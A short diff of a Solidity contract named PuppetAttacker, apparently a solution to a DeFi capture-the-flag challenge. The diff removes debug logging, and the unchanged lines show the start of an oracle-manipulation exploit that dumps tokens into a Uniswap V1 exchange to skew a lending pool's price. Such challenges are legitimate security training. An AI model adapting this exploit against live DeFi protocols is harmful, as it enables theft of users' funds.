@@ -3,7 +3,6 @@ pragma solidity ^0.8.0;
 
 import "solmate/src/tokens/ERC20.sol";
 import "./PuppetPool.sol";
-import "hardhat/console.sol";
 
 interface IUniswapV1Exchange {
     function tokenToEthTransferInput(uint256 tokensSold, uint256 minEth, uint256 deadline, address recipient) external returns(uint256 output);
@@ -26,7 +25,6 @@ contract PuppetAttacker {
         uint256 amount = _token.balanceOf(address(this));
         uint256 poolAmount = _token.balanceOf(address(_lendingPool));
 
-        console.log(address(_player), address(_token), address(_uniswapExchange), address(_lendingPool));
         _token.approve(address(_uniswapExchange), amount);
         _uniswapExchange.tokenToEthTransferInput(amount, 9, block.timestamp, address(this));
 
